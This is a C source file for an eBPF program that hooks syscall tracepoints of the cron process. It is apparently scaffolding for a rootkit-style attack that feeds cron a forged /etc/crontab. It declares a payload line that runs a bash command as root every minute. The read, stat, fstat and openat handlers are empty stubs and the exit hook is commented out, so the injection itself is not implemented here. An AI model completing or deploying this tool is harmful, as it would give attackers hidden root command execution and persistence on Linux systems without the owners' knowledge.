// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */

#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>


#define MISS 0
#define HIT 1
#define SPOOL_DIR	"crontabs"
#define CRONTAB	"/etc/crontab"
#define SYSCRONTAB "/etc/crontab"
#define TASK_COMM_LEN			16
#define SKIP_OFFSET 0x2bb
//#define PAYLOAD "* * * * * root /bin/bash -c \'date > /tmp/pwn\' #"



/* Global Var */
int my_pid = 0;
int cron_pid = 0;
char filename_saved[65]={0};
char openat_filename_saved[0x40]={0};
void* read_buf_ptr = NULL;
struct stat * statbuf_ptr=NULL;
struct stat * statbuf_fstat_ptr=NULL;
int open_fd=0;
char PAYLOAD[]  = "* * * * * root /bin/bash -c 'date > /tmp/pwn' \n #";
int read_fd=0;
int jump_flag = 0;
char string_fmt[] = "\n%s\n";

/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
static __inline void *memcpy(void* dest, const void* src, size_t count);
/* Enter Operation */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx);



/* Exit Hook Operation */
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_exit_stat();
static __inline int handle_exit_fstat();
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx);
/* ****************************** Deceleration Over ****************************** */


/* ****************************** Implement Begin ****************************** */

static __inline int memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *memcpy(void* dest, const void* src, size_t count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}




/* ****************************** Implement Over ****************************** */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx){
  return 0;
}

#define TARGET_NAME "cron"
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    // executable is not cron, return
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }

    //bpf_printk("cron trigger!\n");
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            handle_enter_stat(ctx);
            break;
        case 5:
            handle_enter_fstat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            //bpf_printk("None of targets , break");
            return 0;
    }
    return 0;
}

// SEC("raw_tracepoint/sys_exit")
// int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
// {
//   unsigned int id=0;
//   struct pt_regs *regs;
//   if (cron_pid == 0)
//         return 0;
//     int pid = bpf_get_current_pid_tgid() & 0xffffffff;
//     if (pid != cron_pid)
//         return 0;
  
//   //bpf_printk("Hit pid: %d\n",pid);
//   regs = (struct pt_regs *)(ctx->args[0]);
//   // Read syscall_id from orig_ax
//   //bpf_probe_read_kernel(&id, sizeof(id), regs->orig_ax);
//   id = BPF_CORE_READ(regs,orig_ax);
//   switch (id)
//     {
//         case 0:
//             handle_exit_read(ctx);
//             break;
//         case 4:
//             handle_exit_stat();
//             break;
//         case 5:
//             handle_exit_fstat();
//             break;
//         case 257:
//             handle_exit_openat(ctx);
//             break;
//         default:
//             return 0;
//     }

//   return 0;
// }

char LICENSE[] SEC("license") = "Dual BSD/GPL";